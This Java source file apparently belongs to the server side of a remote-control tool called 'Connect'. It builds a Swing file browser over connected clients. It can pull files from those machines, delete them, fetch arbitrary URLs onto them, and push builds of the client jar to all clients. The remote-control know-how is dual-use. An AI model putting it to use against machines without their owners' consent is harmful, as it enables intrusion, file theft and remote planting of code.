package br.com.introcdc.connect.server.components;
/*
 * Written by IntroCDC, Bruno Coêlho at 15/01/2025 - 18:21
 */

import br.com.introcdc.connect.Connect;
import br.com.introcdc.connect.client.components.InstallComponents;
import br.com.introcdc.connect.server.ConnectServer;
import br.com.introcdc.connect.server.components.settings.FileInfo;
import br.com.introcdc.connect.server.connection.ClientHandler;
import br.com.introcdc.connect.server.gui.ServerGUI;

import javax.swing.*;
import java.awt.*;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.attribute.BasicFileAttributes;
import java.util.List;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Pattern;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class ServerFileComponents {

    public static final Pattern LINE_PATTERN = Pattern.compile("^(?<slash>/?)\\[(?<index>\\d+)\\]\\s+(?<name>.*?)\\s*\\|\\s*(?<info>.+)$");
    public static JFrame FRAME = null;

    private static void handleCommand(String cmd, boolean client) {
        if (client) {
            ServerGUI.sendDirectCommand(cmd);
        } else {
            ConnectServer.handleCommand(cmd);
        }
    }

    public static void createFileNavigator(List<FileInfo> fileList, String title) {
        fileList.sort(Comparator.comparing(FileInfo::isDirectory, Comparator.reverseOrder())
                .thenComparing(FileInfo::getFileName, String.CASE_INSENSITIVE_ORDER));
        fileList.add(0, new FileInfo(true, "Voltar", "..", -1));

        int extended = -1;
        if (FRAME != null) {
            FRAME.dispose();
            extended = FRAME.getExtendedState();
        }
        FRAME = new JFrame(title);
        FRAME.setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
        FRAME.setSize(1500, 700);
        FRAME.setLocationRelativeTo(null);

        try {
            ImageIcon icon = new ImageIcon(ConnectServer.class.getResource("/eye.png"));
            FRAME.setIconImage(icon.getImage());
        } catch (Exception ignored) {
        }

        // ---- Look & Feel dark + palletinha neon ----
        try {
            UIManager.setLookAndFeel("javax.swing.plaf.nimbus.NimbusLookAndFeel");
            if (ServerGUI.DARK_MODE) {
                UIManager.put("control", new Color(12, 14, 20));
                UIManager.put("text", Color.WHITE);
                UIManager.put("nimbusBase", new Color(18, 30, 49));
                UIManager.put("nimbusFocus", new Color(0, 255, 170));
                UIManager.put("nimbusLightBackground", new Color(16, 18, 24));
                UIManager.put("info", new Color(16, 18, 24));
                UIManager.put("nimbusSelectionBackground", new Color(80, 225, 200));
                UIManager.put("nimbusSelectedText", Color.BLACK);
                UIManager.put("nimbusDisabledText", new Color(120, 120, 120));
                UIManager.put("OptionPane.background", new Color(12, 14, 20));
                UIManager.put("Panel.background", new Color(12, 14, 20));
                UIManager.put("TextField.background", new Color(20, 22, 30));
                UIManager.put("TextField.foreground", Color.WHITE);
                UIManager.put("TextArea.background", new Color(17, 19, 26));
                UIManager.put("TextArea.foreground", new Color(225, 255, 245));
                UIManager.put("ComboBox.background", new Color(20, 22, 30));
                UIManager.put("ComboBox.foreground", Color.WHITE);
                UIManager.put("Button.background", new Color(24, 26, 34));
                UIManager.put("Button.foreground", new Color(220, 255, 240));
            }
        } catch (Exception ignored) {
        }

        // ---- ROOT ----
        JPanel root = new JPanel(new BorderLayout());
        root.setBackground(new Color(10, 12, 18));

        // ---- HEADER (gradiente + título) ----
        JPanel header = new NeonGradientPanel(new Color(14, 16, 24), new Color(10, 12, 18));
        header.setLayout(new BorderLayout());
        header.setBorder(BorderFactory.createCompoundBorder(
                BorderFactory.createMatteBorder(0, 0, 1, 0, new Color(40, 255, 200, 80)),
                BorderFactory.createEmptyBorder(12, 16, 12, 16)
        ));

        JLabel titleLabel = new JLabel(title);
        titleLabel.setFont(new Font("Consolas", Font.BOLD, 15));
        titleLabel.setForeground(new Color(160, 255, 230));
        JLabel subLabel = new JLabel("Navegador de arquivos • duplo clique abre/recebe • clique simples seleciona");
        subLabel.setFont(new Font("Consolas", Font.PLAIN, 12));
        subLabel.setForeground(new Color(110, 210, 190));

        JPanel headerText = new JPanel(new GridLayout(2, 1));
        headerText.setOpaque(false);
        headerText.add(titleLabel);
        headerText.add(subLabel);

        JButton refreshTop = neonButton("Atualizar");
        refreshTop.setToolTipText("Recarregar (ls)");
        refreshTop.addActionListener(e -> {
            handleCommand("ls", true);
        });

        JPanel headerRight = new JPanel(new FlowLayout(FlowLayout.RIGHT, 8, 0));
        headerRight.setOpaque(false);
        headerRight.add(refreshTop);

        header.add(headerText, BorderLayout.WEST);
        header.add(headerRight, BorderLayout.EAST);

        // ---- GRID DE CARDS ----
        JPanel gridPanel = new JPanel(new GridLayout(0, 6, 10, 10)); // 6 colunas pra aproveitar largura
        gridPanel.setOpaque(false);

        AtomicReference<JPanel> previouslySelectedCard = new AtomicReference<>(null);
        AtomicReference<FileInfo> selectedFileInfo = new AtomicReference<>(null);

        for (FileInfo fileInfo : fileList) {
            JPanel card = createFileCard(fileInfo);
            card.addMouseListener(new MouseAdapter() {
                @Override
                public void mouseClicked(MouseEvent event) {
                    if (event.getClickCount() == 2) {
                        if (fileInfo.isDirectory()) {
                            if (fileInfo.getIndex() == -1) {
                                handleCommand("cd ..", true);
                                handleCommand("ls", true);
                            } else {
                                handleCommand("cd i:" + fileInfo.getIndex(), true);
                                handleCommand("ls", true);
                            }
                        } else {
                            handleCommand("receive i:" + fileInfo.getIndex(), true);
                        }
                    } else if (event.getClickCount() == 1) {
                        JPanel oldCard = previouslySelectedCard.get();
                        if (oldCard != null) {
                            oldCard.setBorder(BorderFactory.createCompoundBorder(
                                    BorderFactory.createLineBorder(
                                            oldCard.getName().equalsIgnoreCase(InstallComponents.LOCAL_FILE) ? Color.RED : new Color(80, 90, 110), 1, true
                                    ),
                                    BorderFactory.createEmptyBorder(6, 6, 6, 6)
                            ));
                        }
                        card.setBorder(BorderFactory.createCompoundBorder(
                                BorderFactory.createLineBorder(new Color(40, 255, 200), 2, true),
                                BorderFactory.createEmptyBorder(6, 6, 6, 6)
                        ));
                        previouslySelectedCard.set(card);
                        selectedFileInfo.set(fileInfo);
                    }
                }
            });
            gridPanel.add(card);
        }

        JScrollPane scrollPane = new JScrollPane(gridPanel);
        scrollPane.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_NEVER);
        scrollPane.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED);
        scrollPane.getVerticalScrollBar().setUnitIncrement(20);
        scrollPane.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));
        tweakScrollbars(scrollPane);

        // ---- BARRA DE AÇÕES (inferior) ----
        JPanel bottomPanel = new NeonGradientPanel(new Color(12, 14, 20), new Color(8, 10, 16));
        bottomPanel.setLayout(new BorderLayout());
        bottomPanel.setBorder(BorderFactory.createCompoundBorder(
                BorderFactory.createMatteBorder(1, 0, 0, 0, new Color(40, 255, 200, 80)),
                BorderFactory.createEmptyBorder(10, 10, 10, 10)
        ));

        JPanel selectionButtonsPanel = new JPanel(new FlowLayout(FlowLayout.CENTER, 10, 5));
        selectionButtonsPanel.setOpaque(false);

        JButton cdButton = ghostButton("Entrar");
        cdButton.addActionListener(event -> {
            String fileName = JOptionPane.showInputDialog(FRAME,
                    "Digite o nome da pasta para entrar:",
                    "Nome da Pasta",
                    JOptionPane.QUESTION_MESSAGE
            );
            if (fileName != null && !fileName.trim().isEmpty()) {
                handleCommand("cd " + fileName.trim(), true);
                handleCommand("ls", true);
            }
        });

        JButton updateButton = ghostButton("Atualizar");
        updateButton.addActionListener(e -> handleCommand("ls", true));

        JButton fileInfoButton = ghostButton("Detalhes");
        fileInfoButton.addActionListener(e -> {
            FileInfo sel = selectedFileInfo.get();
            if (sel != null) {
                if (sel.getIndex() == -1) {
                    JOptionPane.showMessageDialog(FRAME, "Não é possível ver detalhes desta pasta!", "Aviso", JOptionPane.ERROR_MESSAGE);
                    return;
                }
                handleCommand("fileinfo i:" + sel.getIndex(), true);
            } else {
                JOptionPane.showMessageDialog(FRAME, "Nenhum item selecionado!", "Aviso", JOptionPane.WARNING_MESSAGE);
            }
        });

        JButton viewButton = ghostButton("Visualizar");
        viewButton.addActionListener(e -> {
            FileInfo sel = selectedFileInfo.get();
            if (sel != null) {
                if (sel.getIndex() == -1) {
                    JOptionPane.showMessageDialog(FRAME, "Não é possível visualizar esta pasta!", "Aviso", JOptionPane.ERROR_MESSAGE);
                    return;
                }
                handleCommand("view i:" + sel.getIndex(), true);
            } else {
                JOptionPane.showMessageDialog(FRAME, "Nenhum item selecionado!", "Aviso", JOptionPane.WARNING_MESSAGE);
            }
        });

        JButton receiveButton = neonButton("Receber");
        receiveButton.addActionListener(e -> {
            FileInfo sel = selectedFileInfo.get();
            if (sel != null) {
                if (sel.getIndex() == -1) {
                    JOptionPane.showMessageDialog(FRAME, "Não é possível receber esta pasta!", "Aviso", JOptionPane.ERROR_MESSAGE);
                    return;
                }
                handleCommand("receive i:" + sel.getIndex(), true);
            } else {
                JOptionPane.showMessageDialog(FRAME, "Nenhum item selecionado!");
            }
        });

        JButton sendFileButton = neonButton("Enviar Arquivo");
        sendFileButton.addActionListener(e -> {
            String fileName = JOptionPane.showInputDialog(FRAME,
                    "Digite o nome do arquivo/pasta para enviar (a partir de /connect):",
                    "Nome Arquivo/Pasta",
                    JOptionPane.QUESTION_MESSAGE
            );
            if (fileName != null && !fileName.trim().isEmpty()) {
                handleCommand("send " + fileName.trim(), true);
            }
        });

        JButton moveButton = ghostButton("Mover");
        moveButton.addActionListener(e -> {
            FileInfo sel = selectedFileInfo.get();
            if (sel != null) {
                if (sel.getIndex() == -1) {
                    JOptionPane.showMessageDialog(FRAME, "Não é possível mover esta pasta!", "Aviso", JOptionPane.ERROR_MESSAGE);
                    return;
                }
                String destiny = JOptionPane.showInputDialog(FRAME,
                        "Digite o destino para mover o item '" + sel.getFileName() + "':",
                        "Mover Arquivo/Pasta",
                        JOptionPane.QUESTION_MESSAGE
                );
                if (destiny != null && !destiny.trim().isEmpty()) {
                    handleCommand("move i:" + sel.getIndex() + " " + destiny, true);
                    handleCommand("ls", true);
                }
            } else {
                JOptionPane.showMessageDialog(FRAME, "Nenhum item selecionado!", "Aviso", JOptionPane.WARNING_MESSAGE);
            }
        });

        JButton copyButton = ghostButton("Copiar");
        copyButton.addActionListener(e -> {
            FileInfo sel = selectedFileInfo.get();
            if (sel != null) {
                if (sel.getIndex() == -1) {
                    JOptionPane.showMessageDialog(FRAME, "Não é possível copiar esta pasta!", "Aviso", JOptionPane.ERROR_MESSAGE);
                    return;
                }
                String destiny = JOptionPane.showInputDialog(FRAME,
                        "Digite o destino para copiar o item '" + sel.getFileName() + "':",
                        "Copiar Arquivo/Pasta",
                        JOptionPane.QUESTION_MESSAGE
                );
                if (destiny != null && !destiny.trim().isEmpty()) {
                    handleCommand("copy i:" + sel.getIndex() + " " + destiny, true);
                    handleCommand("ls", true);
                }
            } else {
                JOptionPane.showMessageDialog(FRAME, "Nenhum item selecionado!");
            }
        });

        JButton deleteButton = ghostDangerButton("Deletar");
        deleteButton.addActionListener(event -> {
            FileInfo sel = selectedFileInfo.get();
            if (sel != null) {
                if (sel.getIndex() == -1) {
                    JOptionPane.showMessageDialog(FRAME, "Não é possível deletar esta pasta!", "Aviso", JOptionPane.ERROR_MESSAGE);
                    return;
                }
                int confirm = JOptionPane.showConfirmDialog(
                        FRAME,
                        "Você tem certeza que deseja deletar o item '" + sel.getFileName() + "'?",
                        "Confirmação de Deleção",
                        JOptionPane.YES_NO_OPTION,
                        JOptionPane.WARNING_MESSAGE
                );
                if (confirm == JOptionPane.YES_OPTION) {
                    handleCommand("del i:" + sel.getIndex(), true);
                    handleCommand("ls", true);
                }
            } else {
                JOptionPane.showMessageDialog(FRAME, "Nenhum item selecionado!", "Aviso", JOptionPane.WARNING_MESSAGE);
            }
        });

        JButton zipButton = ghostButton("Zipar");
        zipButton.addActionListener(e -> {
            FileInfo sel = selectedFileInfo.get();
            if (sel != null) {
                if (sel.getIndex() == -1) {
                    JOptionPane.showMessageDialog(FRAME, "Não é possível zipar esta pasta!", "Aviso", JOptionPane.ERROR_MESSAGE);
                    return;
                }
                handleCommand("zip i:" + sel.getIndex(), true);
            } else {
                JOptionPane.showMessageDialog(FRAME, "Nenhum item selecionado!");
            }
        });

        JButton unzipButton = ghostButton("Deszipar");
        unzipButton.addActionListener(e -> {
            FileInfo sel = selectedFileInfo.get();
            if (sel != null) {
                if (sel.getIndex() == -1) {
                    JOptionPane.showMessageDialog(FRAME, "Não é possível deszipar esta pasta!", "Aviso", JOptionPane.ERROR_MESSAGE);
                    return;
                }
                handleCommand("unzip i:" + sel.getIndex(), true);
            } else {
                JOptionPane.showMessageDialog(FRAME, "Nenhum item selecionado!");
            }
        });

        JButton downloadButton = neonButton("Baixar URL");
        downloadButton.addActionListener(e -> {
            String url = JOptionPane.showInputDialog(FRAME,
                    "Digite o URL do arquivo para baixar no cliente:",
                    "URL",
                    JOptionPane.QUESTION_MESSAGE
            );
            if (url != null && !url.trim().isEmpty()) {
                handleCommand("download " + url.trim(), true);
            }
        });

        JButton createFolderButton = neonButton("Criar Pasta");
        createFolderButton.addActionListener(e -> {
            String fileName = JOptionPane.showInputDialog(FRAME,
                    "Digite o nome da pasta para criar:",
                    "Nome da Pasta",
                    JOptionPane.QUESTION_MESSAGE
            );
            if (fileName != null && !fileName.trim().isEmpty()) {
                handleCommand("mkdir " + fileName.trim(), true);
                handleCommand("ls", true);
            }
        });

        // Ordem: principais (neon) intercalados
        selectionButtonsPanel.add(cdButton);
        selectionButtonsPanel.add(updateButton);
        selectionButtonsPanel.add(fileInfoButton);
        selectionButtonsPanel.add(viewButton);
        selectionButtonsPanel.add(receiveButton);
        selectionButtonsPanel.add(sendFileButton);
        selectionButtonsPanel.add(moveButton);
        selectionButtonsPanel.add(copyButton);
        selectionButtonsPanel.add(deleteButton);
        selectionButtonsPanel.add(zipButton);
        selectionButtonsPanel.add(unzipButton);
        selectionButtonsPanel.add(downloadButton);
        selectionButtonsPanel.add(createFolderButton);

        bottomPanel.add(selectionButtonsPanel, BorderLayout.CENTER);

        // ---- Monta tudo ----
        root.add(header, BorderLayout.NORTH);
        root.add(scrollPane, BorderLayout.CENTER);
        root.add(bottomPanel, BorderLayout.SOUTH);

        FRAME.setContentPane(root);
        if (ServerGUI.DARK_MODE) SwingUtilities.updateComponentTreeUI(FRAME);
        FRAME.setVisible(true);
        if (extended != -1) {
            FRAME.setExtendedState(extended);
        }
    }

    private static JPanel createFileCard(FileInfo fileInfo) {
        JPanel card = new JPanel(new BorderLayout()) {
            @Override
            protected void paintComponent(Graphics g) {
                super.paintComponent(g);
                // leve brilho no topo
                Graphics2D g2 = (Graphics2D) g.create();
                g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
                GradientPaint gp = new GradientPaint(0, 0, new Color(20, 22, 30), 0, getHeight(), new Color(14, 16, 22));
                g2.setPaint(gp);
                g2.fillRoundRect(0, 0, getWidth(), getHeight(), 12, 12);
                g2.dispose();
            }
        };
        card.setOpaque(false);
        card.setName(fileInfo.getFileName());
        card.setBorder(BorderFactory.createCompoundBorder(
                BorderFactory.createLineBorder(
                        fileInfo.getFileName().equalsIgnoreCase(InstallComponents.LOCAL_FILE) ? Color.RED : new Color(80, 90, 110), 1, true
                ),
                BorderFactory.createEmptyBorder(6, 6, 6, 6)
        ));
        card.setPreferredSize(new Dimension(200, 120));
        card.setMaximumSize(new Dimension(220, 140));
        card.setMinimumSize(new Dimension(180, 110));

        // Ícone
        String iconText = fileInfo.isDirectory() ? "\uD83D\uDCC1" : "\uD83D\uDCC4";
        JLabel iconLabel = new JLabel(iconText, SwingConstants.CENTER);
        iconLabel.setFont(new Font("SansSerif", Font.PLAIN, 34));
        iconLabel.setForeground(new Color(200, 255, 245));

        // Nome
        JLabel name = new JLabel(fileInfo.getFileName(), SwingConstants.CENTER);
        name.setFont(new Font("Consolas", Font.PLAIN, 12));
        name.setForeground(new Color(220, 255, 245));

        // Extra
        JLabel extra = new JLabel(fileInfo.getFileSize(), SwingConstants.CENTER);
        extra.setFont(new Font("Consolas", Font.ITALIC, 11));
        extra.setForeground(new Color(150, 205, 195));

        JPanel center = new JPanel(new BorderLayout());
        center.setOpaque(false);
        center.add(iconLabel, BorderLayout.CENTER);

        JPanel labelPanel = new JPanel(new GridLayout(2, 1));
        labelPanel.setOpaque(false);
        labelPanel.add(name);
        labelPanel.add(extra);

        card.add(center, BorderLayout.CENTER);
        card.add(labelPanel, BorderLayout.SOUTH);

        return card;
    }

    public static void readFolder(File folder, Map<String, String> files, String base) {
        for (File file : folder.listFiles()) {
            if (file.isDirectory()) {
                readFolder(file, files, base + "/" + file.getName());
            } else {
                files.put(base + "/" + file.getName(), base + "/" + file.getName());
            }
        }
    }

    public static void createZip(File folder, File destiny) throws IOException {
        Map<String, String> files = new HashMap<>();
        readFolder(folder, files, folder.getName());
        createZip(files, destiny);
    }

    public static void createZip(Map<String, String> files, File destiny) throws IOException {
        System.out.println(destiny.getAbsolutePath());
        if (!destiny.exists()) {
            destiny.createNewFile();
        }

        int BUFFER = 2048;
        BufferedInputStream origin;
        FileOutputStream dest = new FileOutputStream(destiny);
        ZipOutputStream out = new ZipOutputStream(new BufferedOutputStream(dest));
        for (String file : files.keySet()) {
            byte[] data = new byte[BUFFER];
            FileInputStream fileInput = new FileInputStream(file);
            origin = new BufferedInputStream(fileInput, BUFFER);
            ZipEntry entry = new ZipEntry(files.get(file));
            out.putNextEntry(entry);
            int count;
            while ((count = origin.read(data, 0, BUFFER)) != -1) {
                out.write(data, 0, count);
                out.flush();
            }
            origin.close();
        }
        out.flush();
        out.close();
    }

    public static void deleteFile(File file) {
        if (file.exists()) {
            deleteFile(file.toPath());
        }
    }

    public static void deleteFile(Path path) {
        try {
            Files.walkFileTree(path, new SimpleFileVisitor<Path>() {

                private FileVisitResult handleException(IOException exception) {
                    return FileVisitResult.TERMINATE;
                }

                @Override
                public FileVisitResult postVisitDirectory(Path dir, IOException exception) throws IOException {
                    if (exception != null) {
                        return handleException(exception);
                    }
                    Files.delete(dir);
                    return FileVisitResult.CONTINUE;
                }

                @Override
                public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {
                    Files.delete(file);
                    return FileVisitResult.CONTINUE;
                }

                @Override
                public FileVisitResult visitFileFailed(Path file, IOException exception) {
                    return handleException(exception);
                }
            });
        } catch (Exception ignored) {
        }
    }

    public static void sendFile(String input) {
        File file = new File("connect/" + input);
        if (!file.exists()) {
            ConnectServer.msg("Arquivo não encontrado para envio!");
            return;
        }
        boolean temp = false;
        if (file.isDirectory()) {
            temp = true;
            ConnectServer.msg("Pasta " + file.getName() + " sendo zipada para envio...");
            try {
                ServerFileComponents.createZip(file, new File("connect/file.zip"));
            } catch (Exception exception) {
                ConnectServer.msg("Ocorreu um erro ao zipar a pasta " + file.getName());
                return;
            }
            file = new File("connect/file.zip");
        }
        ConnectServer.msg("Preparando-se para enviar arquivo" + (ConnectServer.SELECTED_CLIENT == -1 ? " para todos os clientes..." : "..."));
        File fileToSend = file;
        boolean temporary = temp;
        ConnectServer.EXECUTOR.schedule(() -> new Thread(() -> {
            int toSend = 1;
            if (ConnectServer.SELECTED_CLIENT == -1) {
                if (ConnectServer.CLIENTS.isEmpty()) {
                    ConnectServer.msg("Não possui nenhum cliente conectado no momento!");
                } else {
                    Collection<ClientHandler> clientHandlerList = new ArrayList<>(ConnectServer.CLIENTS.values());
                    toSend = clientHandlerList.size();
                    for (ClientHandler clientHandler : clientHandlerList) {
                        clientHandler.send("send " + fileToSend.getName());
                    }
                }
            } else {
                ClientHandler client = ConnectServer.CLIENTS.get(ConnectServer.SELECTED_CLIENT);
                client.send("send " + fileToSend.getName());
            }

            try (ServerSocket serverSocket = new ServerSocket(Connect.PORT + 4)) {
                int connected = 0;
                while (connected < toSend) {
                    try (Socket clientSocket = serverSocket.accept();
                         DataOutputStream dos = new DataOutputStream(clientSocket.getOutputStream());
                         BufferedInputStream bis = new BufferedInputStream(new FileInputStream(fileToSend))) {
                        connected++;
                        try {
                            dos.writeUTF(fileToSend.getName());
                            dos.flush();
                            dos.writeUTF(fileToSend.getName());
                            dos.flush();
                            dos.writeUTF("temp:" + temporary);
                            dos.flush();

                            byte[] buffer = new byte[4096];
                            int bytesRead;
                            while ((bytesRead = bis.read(buffer)) != -1) {
                                dos.write(buffer, 0, bytesRead);
                                ConnectServer.addBytes(fileToSend.length(), true);
                            }
                        } catch (Exception exception) {
                            ConnectServer.msg("Ocorreu um erro ao enviar um arquivo via socket pós conexão!");
                        }
                    } catch (Exception exception) {
                        ConnectServer.msg("Ocorreu um erro ao enviar um arquivo via socket...");
                    }
                }

                if (temporary) {
                    ServerFileComponents.deleteFile(fileToSend);
                }
            } catch (Exception exception) {
                ConnectServer.msg("Ocorreu um erro ao enviar o arquivo para o cliente! (" + exception.getMessage() + ")");
            }
        }).start(), 100, TimeUnit.MILLISECONDS);
    }

    public static void handleUpdate() {
        File connectFile = new File("connect/Connect.jar");
        if (!connectFile.exists()) {
            JOptionPane.showMessageDialog(null, "Crie uma build no botão 'Criar Build' para enviar uma atualização!", "Erro", JOptionPane.ERROR_MESSAGE);
            return;
        }

        sendFile("Connect.jar");
    }

    // ======== VISUAIS AUXILIARES (dentro de ServerFileComponents) ========
    private static Color accent() {
        return new Color(40, 255, 200);
    }

    private static Color accentSoft() {
        return new Color(40, 255, 200, 90);
    }

    private static JButton neonButton(String text) {
        JButton b = new JButton(text);
        b.setFont(new Font("Consolas", Font.BOLD, 12));
        b.setForeground(new Color(14, 16, 20));
        b.setBackground(accent());
        b.setFocusPainted(false);
        b.setBorder(BorderFactory.createCompoundBorder(
                BorderFactory.createLineBorder(new Color(120, 255, 230), 1, true),
                BorderFactory.createEmptyBorder(8, 14, 8, 14)
        ));
        b.addMouseListener(new java.awt.event.MouseAdapter() {
            @Override
            public void mouseEntered(java.awt.event.MouseEvent e) {
                b.setBackground(new Color(80, 255, 225));
            }

            @Override
            public void mouseExited(java.awt.event.MouseEvent e) {
                b.setBackground(accent());
            }
        });
        return b;
    }

    private static JButton ghostButton(String text) {
        JButton b = new JButton(text);
        b.setFont(new Font("Consolas", Font.BOLD, 12));
        b.setForeground(new Color(210, 255, 245));
        b.setBackground(new Color(24, 26, 34));
        b.setFocusPainted(false);
        b.setBorder(BorderFactory.createCompoundBorder(
                BorderFactory.createLineBorder(accentSoft(), 1, true),
                BorderFactory.createEmptyBorder(8, 14, 8, 14)
        ));
        b.addMouseListener(new java.awt.event.MouseAdapter() {
            @Override
            public void mouseEntered(java.awt.event.MouseEvent e) {
                b.setBorder(BorderFactory.createCompoundBorder(
                        BorderFactory.createLineBorder(accent(), 1, true),
                        BorderFactory.createEmptyBorder(8, 14, 8, 14)
                ));
            }

            @Override
            public void mouseExited(java.awt.event.MouseEvent e) {
                b.setBorder(BorderFactory.createCompoundBorder(
                        BorderFactory.createLineBorder(accentSoft(), 1, true),
                        BorderFactory.createEmptyBorder(8, 14, 8, 14)
                ));
            }
        });
        return b;
    }

    private static JButton ghostDangerButton(String text) {
        JButton b = ghostButton(text);
        b.setForeground(new Color(255, 180, 180));
        b.setBorder(BorderFactory.createCompoundBorder(
                BorderFactory.createLineBorder(new Color(255, 90, 90, 160), 1, true),
                BorderFactory.createEmptyBorder(8, 14, 8, 14)
        ));
        b.addMouseListener(new java.awt.event.MouseAdapter() {
            @Override
            public void mouseEntered(java.awt.event.MouseEvent e) {
                b.setBorder(BorderFactory.createCompoundBorder(
                        BorderFactory.createLineBorder(new Color(255, 120, 120), 1, true),
                        BorderFactory.createEmptyBorder(8, 14, 8, 14)
                ));
            }

            @Override
            public void mouseExited(java.awt.event.MouseEvent e) {
                b.setBorder(BorderFactory.createCompoundBorder(
                        BorderFactory.createLineBorder(new Color(255, 90, 90, 160), 1, true),
                        BorderFactory.createEmptyBorder(8, 14, 8, 14)
                ));
            }
        });
        return b;
    }

    // Painel com degradê sutil
    private static class NeonGradientPanel extends JPanel {
        private final Color c1, c2;

        NeonGradientPanel(Color c1, Color c2) {
            this.c1 = c1;
            this.c2 = c2;
            setOpaque(false);
        }

        @Override
        protected void paintComponent(Graphics g) {
            Graphics2D g2 = (Graphics2D) g.create();
            g2.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON);
            int w = getWidth(), h = getHeight();
            GradientPaint gp = new GradientPaint(0, 0, c1, 0, h, c2);
            g2.setPaint(gp);
            g2.fillRect(0, 0, w, h);
            g2.dispose();
            super.paintComponent(g);
        }
    }

    // Scrollbars temáticas sem libs extras
    private static void tweakScrollbars(JScrollPane sp) {
        sp.setBorder(BorderFactory.createCompoundBorder(
                BorderFactory.createLineBorder(new Color(40, 255, 200, 90), 1, true),
                BorderFactory.createEmptyBorder(2, 2, 2, 2)
        ));
        sp.getVerticalScrollBar().setUI(new javax.swing.plaf.basic.BasicScrollBarUI() {
            @Override
            protected void configureScrollBarColors() {
                this.thumbColor = new Color(40, 255, 200, 100);
                this.trackColor = new Color(14, 16, 22);
            }
        });
        sp.getHorizontalScrollBar().setUI(new javax.swing.plaf.basic.BasicScrollBarUI() {
            @Override
            protected void configureScrollBarColors() {
                this.thumbColor = new Color(40, 255, 200, 100);
                this.trackColor = new Color(14, 16, 22);
            }
        });
    }

}
